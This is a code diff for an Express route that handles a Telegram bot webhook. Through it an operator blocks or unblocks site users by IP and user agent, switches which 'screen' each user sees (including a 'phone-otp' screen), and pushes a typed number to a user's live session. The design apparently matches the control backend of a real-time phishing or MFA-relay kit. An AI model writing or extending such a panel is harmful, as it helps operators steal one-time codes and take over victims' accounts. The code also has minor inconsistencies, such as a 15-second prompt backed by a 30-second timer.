@@ -508,16 +508,10 @@ router.post("/deleteuser", async (req, res) => {
 
 router.post("/telegram-webhook", async (req, res) => {
   const data = req.body;
-
-  if (!data.callback_query) return res.sendStatus(200);
-
-  const callback = data.callback_query;
-  const { message } = callback;
-  const [_, command, userId] = callback.data.split(":");
-
+	
   try {
     // ------------------------------------------------
-    // Get Telegram credentials
+    // Get bot token
     // ------------------------------------------------
     const telegramInfo = await db.get(
       `SELECT BotToken FROM admin_settings WHERE id = ?`,
@@ -527,45 +521,158 @@ router.post("/telegram-webhook", async (req, res) => {
 
     const botToken = telegramInfo.BotToken;
 
-    // ------------------------------------------------
-    // 1️⃣ Stop loading animation
-    // ------------------------------------------------
+    // ============================================================
+    // 1️⃣ HANDLE NORMAL MESSAGE (user reply after prompt)
+    // ============================================================
+    if (data.message && !data.callback_query) {
+      const chatId = data.message.chat.id;
+      const text = data.message.text?.trim();
+      
+      console.log(text);
+
+      if (!pendingPrompts.has(chatId)) {
+        return res.sendStatus(200); // Not a prompt reply
+      }
+
+      const promptData = pendingPrompts.get(chatId);
+	  const { userId, messageId, command } = promptData;
+
+      // Clear timer
+      if (pendingButtonTimers.has(chatId)) {
+        clearTimeout(pendingButtonTimers.get(chatId));
+        pendingButtonTimers.delete(chatId);
+      }
+
+      pendingPrompts.delete(chatId);
+
+      // Validate number
+      if (!/^\d+$/.test(text)) {
+        await axios.post(
+          `https://api.telegram.org/bot${botToken}/sendMessage`,
+          {
+            chat_id: chatId,
+            text: "❌ Invalid number."
+          }
+        );
+        return res.sendStatus(200);
+      }
+
+      // Send number to your handler/webhook logic
+      await handleAdminCommand({
+		  userId,
+		  command,
+		  otp: text,
+		  io,
+		  db
+		});
+
+      await axios.post(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          chat_id: chatId,
+          text: "✅ Number sent successfully."
+        }
+      );
+
+      return res.sendStatus(200);
+    }
+
+    // ============================================================
+    // 2️⃣ HANDLE CALLBACK (button clicks)
+    // ============================================================
+    if (!data.callback_query) return res.sendStatus(200);
+
+    const callback = data.callback_query;
+    const { message } = callback;
+    const chatId = message.chat.id;
+    const messageId = message.message_id;
+    const [_, command, userId] = callback.data.split(":");
+	console.log("Command in Routes js", command);
+    // Stop loading animation
     await axios.post(
       `https://api.telegram.org/bot${botToken}/answerCallbackQuery`,
       { callback_query_id: callback.id }
     );
 
-    // ------------------------------------------------
-    // 2️⃣ Prevent multiple clicks
-    // ------------------------------------------------
+    // Cancel existing timer
+    if (pendingButtonTimers.has(chatId)) {
+      clearTimeout(pendingButtonTimers.get(chatId));
+      pendingButtonTimers.delete(chatId);
+    }
+
+    // Prevent double clicks
     if (activeLocks.has(userId)) return res.sendStatus(200);
     activeLocks.add(userId);
 
-    // ------------------------------------------------
-    // 3️⃣ Handle BLOCK / UNBLOCK
-    // ------------------------------------------------
+    // ============================================================
+    // 🔹 PROMPT COMMAND
+    // ============================================================
+    if (command === "prompt" || command === "phone-otp") {
+    	
+    	
+      // Ask immediately
+      await axios.post(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        {
+          chat_id: chatId,
+          text: `Enter a number (15 sec)\n\nCurrent Screen: ${command} screen`
+        }
+      ); 
+      
+      if (pendingButtonTimers.has(chatId)) {
+      clearTimeout(pendingButtonTimers.get(chatId));
+      pendingButtonTimers.delete(chatId);
+    }
+
+      // Store pending prompt
+      pendingPrompts.set(chatId, { userId, messageId, command });
+
+      // Start 15s timer
+      const timer = setTimeout(async () => {
+        try {
+          if (!pendingPrompts.has(chatId)) return;
+
+          pendingPrompts.delete(chatId);
+
+          await axios.post(
+            `https://api.telegram.org/bot${botToken}/editMessageText`,
+            {
+              chat_id: chatId, 
+              message_id: messageId,
+              text: `${message.text}\n\n❌ Enter ${command}: time over`,
+              parse_mode: "HTML"
+            }
+          );
+        } catch (err) {
+          console.error("Prompt expire error:", err.message);
+        }
+
+        pendingButtonTimers.delete(chatId);
+      }, 30000);
+
+      pendingButtonTimers.set(chatId, timer);
+
+      activeLocks.delete(userId);
+      return res.sendStatus(200);
+    }
+
+    // ============================================================
+    // 🔹 BLOCK / UNBLOCK
+    // ============================================================
     if (command === "block" || command === "unblock") {
       const userRow = await db.get(
         "SELECT system_info, ip FROM users WHERE id = ?",
         [userId]
       );
 
-      
+      let systemInfo = {};
       try {
         systemInfo = JSON.parse(userRow?.system_info || "{}");
-      } catch (err) {
-        console.warn(`Failed to parse system_info for user ${userId}`);
-      }
-      
-      console.log(systemInfo);
+      } catch {}
 
       if (command === "block") {
         systemInfo.blocked = true;
-
-        const ip = userRow?.ip || null;
-        const ua = userRow?.system_info.ua || null;
-
-        await addToBlacklist(ip, ua, userId);
+        await addToBlacklist(userRow?.ip, systemInfo?.ua, userId);
       } else {
         systemInfo.blocked = false;
         await removeFromBlacklist(userId);
@@ -576,48 +683,43 @@ router.post("/telegram-webhook", async (req, res) => {
         [JSON.stringify(systemInfo), userId]
       );
 
-      console.log(
-        `✅ USER ${userId} has been ${systemInfo.blocked ? "blocked" : "unblocked"}`
-      );
-
-      // Rebuild keyboard after status change
       const buttons = await buildTelButtons(userId, db);
 
       await axios.post(
         `https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`,
         {
-          chat_id: message.chat.id,
-          message_id: message.message_id,
+          chat_id: chatId,
+          message_id: messageId,
           reply_markup: { inline_keyboard: buttons }
         }
       );
+
+      activeLocks.delete(userId);
+      return res.sendStatus(200);
     }
 
-    // ------------------------------------------------
-    // 4️⃣ Handle other commands
-    // ------------------------------------------------
-    else {
-      let otp;
-      await handleAdminCommand({ userId, command, otp, io, db });
+    // ============================================================
+    // 🔹 OTHER COMMANDS
+    // ============================================================
+    await handleAdminCommand({ userId, command, io, db });
 
-      await axios.post(
-        `https://api.telegram.org/bot${botToken}/editMessageText`,
-        {
-          chat_id: message.chat.id,
-          message_id: message.message_id,
-          text: `${message.text}\n\n✅ Command sent`,
-          parse_mode: "HTML"
-        }
-      );
-    }
+    await axios.post(
+      `https://api.telegram.org/bot${botToken}/editMessageText`,
+      {
+        chat_id: chatId,
+        message_id: messageId,
+        text: `${message.text}\n\n✅ Command sent`,
+        parse_mode: "HTML"
+      }
+    );
+
+    activeLocks.delete(userId);
+    return res.sendStatus(200);
 
   } catch (err) {
     console.error("❌ Telegram webhook error:", err);
-  } finally {
-    activeLocks.delete(userId);
+    return res.sendStatus(200);
   }
-
-  res.sendStatus(200);
 });
 
   return router;
